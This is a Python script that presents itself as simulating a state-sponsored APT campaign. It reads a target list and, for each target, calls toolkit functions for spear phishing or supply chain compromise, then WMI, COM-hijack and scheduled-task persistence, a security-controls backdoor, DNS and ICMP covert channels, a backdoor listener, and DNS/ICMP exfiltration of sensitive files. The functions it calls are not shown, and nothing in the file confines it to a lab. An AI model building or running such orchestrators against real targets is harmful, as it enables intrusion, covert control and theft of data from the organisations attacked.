import os
import sys
import time

# Add the project root to the Python path
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
sys.path.insert(0, project_root)

from apt_toolkit.initial_access_enhanced import spear_phishing, supply_chain_compromise
from apt_toolkit.persistence_enhanced import wmi_persistence, com_hijacking, scheduled_task_persistence
from apt_toolkit.defense_evasion_enhanced import enable_security_controls_backdoor
from apt_toolkit.command_control import start_dns_covert_channel, start_icmp_covert_channel, start_backdoor_listener
from apt_toolkit.exfiltration import exfiltrate_data_dns, exfiltrate_data_icmp

def read_targets(filename="targets.txt"):
    """Reads targets from a file."""
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def simulate_campaign(targets):
    """Simulates the APT campaign against the given targets."""
    print("Starting Chinese APT Campaign: Operation Dragon's Fire")
    print("=====================================================")

    for target in targets:
        print(f"\n[+] Targeting: {target}")
        print("-" * (len(target) + 15))

        # 1. Initial Access
        print("[*] Phase 1: Initial Access")
        if "Department" in target:
            print("    - Simulating supply chain compromise...")
            supply_chain_compromise(target)
        else:
            print("    - Simulating spear phishing attack...")
            spear_phishing(target, "CEO")
        time.sleep(1)

        # 2. Persistence
        print("\n[*] Phase 2: Establishing Persistence")
        print("    - Using WMI event subscriptions...")
        wmi_persistence()
        print("    - Using COM hijacking...")
        com_hijacking()
        print("    - Using scheduled tasks...")
        scheduled_task_persistence()
        time.sleep(1)

        # 3. Defense Evasion
        print("\n[*] Phase 3: Defense Evasion")
        print("    - Enabling security controls backdoor...")
        enable_security_controls_backdoor()
        time.sleep(1)

        # 4. Command and Control
        print("\n[*] Phase 4: Command and Control")
        print("    - Starting DNS covert channel...")
        start_dns_covert_channel()
        print("    - Starting ICMP covert channel...")
        start_icmp_covert_channel()
        print("    - Starting backdoor listener...")
        start_backdoor_listener()
        time.sleep(1)

        # 5. Exfiltration
        print("\n[*] Phase 5: Data Exfiltration")
        print("    - Exfiltrating data via DNS...")
        exfiltrate_data_dns("sensitive_intel.zip")
        print("    - Exfiltrating data via ICMP...")
        exfiltrate_data_icmp("classified_documents.pdf")
        time.sleep(1)

        print(f"\n[+] Successfully compromised {target}")
        print("=====================================================")

if __name__ == "__main__":
    targets = read_targets()
    simulate_campaign(targets)
